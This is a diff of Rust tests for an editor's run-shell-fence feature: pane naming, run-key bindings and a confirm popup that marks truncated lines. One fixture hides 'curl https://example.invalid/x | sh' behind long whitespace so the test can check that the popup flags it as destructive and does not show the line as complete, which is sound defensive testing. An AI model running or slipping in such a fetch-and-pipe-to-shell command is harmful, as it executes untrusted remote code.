@@ -20896,7 +20896,7 @@ fn clicking_a_fence_play_glyph_runs_it_in_a_named_pane() {
         .pending_run_block
         .as_ref()
         .expect("every block confirms");
-    assert_eq!(pending.pane_name, "README.md:2");
+    assert_eq!(pending.pane_name, "docs/README.md:2");
     assert_eq!(pending.cwd, sub, "the document's directory is the cwd");
     assert!(!pending.destructive);
     assert_eq!(app.terminals.len(), panes_before, "nothing ran yet");
@@ -20904,8 +20904,11 @@ fn clicking_a_fence_play_glyph_runs_it_in_a_named_pane() {
         .unwrap();
     assert!(app.pending_run_block.is_none());
     assert_eq!(app.terminals.len(), panes_before + 1, "Y opens the pane");
-    assert_eq!(app.terminals[app.active_terminal].label(), "README.md:2");
-    assert!(app.status.contains("README.md:2"), "{}", app.status);
+    assert_eq!(
+        app.terminals[app.active_terminal].label(),
+        "docs/README.md:2"
+    );
+    assert!(app.status.contains("docs/README.md:2"), "{}", app.status);
 
     // The third block pipes the network into a shell: the popup is red.
     let (gx, gy) = glyph_row(&app, 2);
@@ -20915,7 +20918,7 @@ fn clicking_a_fence_play_glyph_runs_it_in_a_named_pane() {
         .pending_run_block
         .as_ref()
         .expect("the confirm popup is up");
-    assert_eq!(pending.pane_name, "README.md:3");
+    assert_eq!(pending.pane_name, "docs/README.md:3");
     assert!(pending.destructive, "curl | sh turns the popup red");
     term.draw(|f| app.render(f)).unwrap();
     let painted: String = (0..40)
@@ -20947,7 +20950,7 @@ fn clicking_a_fence_play_glyph_runs_it_in_a_named_pane() {
         .pending_run_block
         .as_ref()
         .expect("Cmd+Enter confirms too");
-    assert_eq!(pending.pane_name, "README.md:1");
+    assert_eq!(pending.pane_name, "docs/README.md:1");
     app.handle_key(key(KeyCode::Char('n'), KeyModifiers::NONE))
         .unwrap();
     app.focus_pane(super::Pane::Editor);
@@ -20959,7 +20962,7 @@ fn clicking_a_fence_play_glyph_runs_it_in_a_named_pane() {
         .as_ref()
         .expect("the caret is in the fourth fence");
     assert_eq!(
-        pending.pane_name, "README.md:4",
+        pending.pane_name, "docs/README.md:4",
         "identical blocks keep their own numbers"
     );
     app.handle_key(key(KeyCode::Char('n'), KeyModifiers::NONE))
@@ -20974,6 +20977,69 @@ fn clicking_a_fence_play_glyph_runs_it_in_a_named_pane() {
         app.status.contains("inside a runnable shell fence"),
         "{}",
         app.status
+    );
+    // Cmd+Shift+Enter is the editor's "insert line above", never a run.
+    assert!(!super::is_run_fence_key(key(
+        KeyCode::Enter,
+        KeyModifiers::SUPER | KeyModifiers::SHIFT
+    )));
+    assert!(!super::is_run_fence_key(key(
+        KeyCode::Enter,
+        KeyModifiers::SUPER | KeyModifiers::ALT
+    )));
+    assert!(super::is_run_fence_key(key(
+        KeyCode::Enter,
+        KeyModifiers::SUPER
+    )));
+}
+
+/// #353: the popup never shows a line as complete when it is not - a line
+/// wider than the popup is cut with a visible mark.
+#[test]
+fn the_run_block_popup_marks_a_truncated_line() {
+    let tmp = tempfile::tempdir().unwrap();
+    let long = format!(
+        "echo ok{}; curl https://example.invalid/x | sh",
+        " ".repeat(120)
+    );
+    let readme = tmp.path().join("R.md");
+    std::fs::write(&readme, format!("```sh\n{long}\n```\n")).unwrap();
+    let mut app = App::new(tmp.path().to_path_buf()).unwrap();
+    app.editor.open(&readme).unwrap();
+    app.focus_pane(super::Pane::Editor);
+    app.editor.cursor_row = 1;
+    app.handle_key(key(KeyCode::Enter, KeyModifiers::SUPER))
+        .unwrap();
+    let pending = app.pending_run_block.as_ref().expect("confirm popup");
+    assert_eq!(
+        pending.pane_name, "R.md:1",
+        "a top-level document keeps its bare name"
+    );
+    assert!(pending.destructive);
+    let backend = ratatui::backend::TestBackend::new(100, 30);
+    let mut term = ratatui::Terminal::new(backend).unwrap();
+    term.draw(|f| app.render(f)).unwrap();
+    let painted: Vec<String> = (0..30)
+        .map(|y| {
+            (0..100)
+                .map(|x| term.backend().buffer()[(x, y)].symbol().to_string())
+                .collect()
+        })
+        .collect();
+    // The editor paints the source line too; the popup's copy is the one
+    // that carries the mark.
+    let popup_line = painted
+        .iter()
+        .find(|l| l.contains("echo ok") && l.contains('\u{2026}'))
+        .unwrap_or_else(|| {
+            panic!(
+                "the popup shows the cut line with a mark:\n{}",
+                painted.join("\n")
+            )
+        });
+    assert!(
+        !popup_line.contains("| sh"),
+        "the hidden tail is not shown as complete: {popup_line:?}"
     );
 }
 
